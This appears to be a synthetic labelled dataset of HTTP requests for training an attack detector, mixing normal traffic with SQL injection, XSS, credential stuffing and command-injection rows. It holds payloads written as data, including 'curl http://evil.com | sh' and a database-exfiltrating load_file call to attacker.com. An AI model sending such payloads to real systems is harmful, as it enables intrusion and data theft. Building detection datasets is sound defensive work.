timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server
2026-03-15 16:01:15,172.16.0.32,3.12.45.78,https,post,/login,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",username=user&password=123456,403,6106,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,username=user&password=123456,credential_stuffing_brute_force,16,6,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-07 19:57:57,172.16.0.225,172.67.128.45,http,post,/login,"{""Host"":""52.45.123.89"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",username=test&password=admin123,401,1778,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,username=test&password=admin123,credential_stuffing_brute_force,19,5,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",52.45.123.89,Nmap Scripting Engine,*/*,text/html,Apache
2026-03-06 16:37:29,172.16.0.68,185.199.108.153,http,get,"/login?user=' or if(1=1, sleep(5), 0)--","{""Host"":""172.67.128.45"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,403,6076,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,"' or if(1=1, sleep(5), 0)--",sql_injection,16,4,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,XSStrike/3.1.5,*/*,text/html,nginx
2026-03-14 05:59:42,104.18.24.216,203.0.113.45,http,get,"/search?q=' and extractvalue(1,concat(0x7e,database()))--","{""Host"":""198.51.100.23"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,500,7711,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,"' and extractvalue(1,concat(0x7e,database()))--",sql_injection,5,5,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-06 06:05:29,172.16.0.200,104.18.24.12,http,post,/register?sort=product1,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=Great article!,200,4457,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,6,4,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-07 00:47:21,172.16.0.114,10.0.0.1,https,get,/traceroute?host=&& curl http://evil.com | sh,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,401,1856,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,&& curl http://evil.com | sh,command_injection,0,5,1,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-03 06:29:18,10.0.0.133,10.0.0.1,http,post,/login,"{""Host"":""10.0.0.1"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",username=bob&password=Spring2024,404,1625,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nmap Scripting Engine,username=bob&password=spring2024,credential_stuffing_brute_force,6,1,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,Nmap Scripting Engine,*/*,text/html,IIS
2026-03-19 14:13:09,192.168.1.15,172.67.128.45,https,post,/login,"{""Host"":""185.199.108.153"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",email=test35@test.com&password=password,401,5289,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,email=test35@test.com&password=password,credential_stuffing_brute_force,14,3,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Nmap Scripting Engine,*/*,text/html,Apache
2026-03-11 05:03:58,192.168.1.179,52.45.123.89,https,get,/contact?q=product1,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,200,4034,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,5,2,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,nginx
2026-03-05 14:27:55,185.199.108.13,34.120.45.67,https,get,/register,"{""Host"":""192.168.1.1"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",,302,4835,"{""Content-Type"":""text/html"",""Server"":""Apache""}",python-requests/2.28.0,,normal,14,3,0,0,"{'Host': '192.168.1.1', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,python-requests/2.28.0,*/*,text/html,Apache
2026-03-09 11:56:43,192.168.1.93,192.168.1.1,https,get,/search?q='; waitfor delay '0:0:5'--,"{""Host"":""34.120.45.67"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,200,4565,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,'; waitfor delay '0:0:5'--,sql_injection,11,0,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Nikto/2.5.0,*/*,text/html,Apache
2026-03-12 06:05:11,192.168.1.185,203.0.113.45,http,get,"/search?q=' and load_file(concat('\\',database(),'.attacker.com\'))--","{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,7640,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,"' and load_file(concat('\\',database(),'.attacker.com\'))--",sql_injection,6,3,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-22 09:59:01,192.168.1.246,3.12.45.78,http,get,/search?q=alert('your session has expired'),"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,5110,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,alert('your session has expired'),xss,9,6,1,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS
2026-03-06 01:20:11,172.67.128.166,172.67.128.45,https,get,/login,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,302,1795,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,1,4,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache
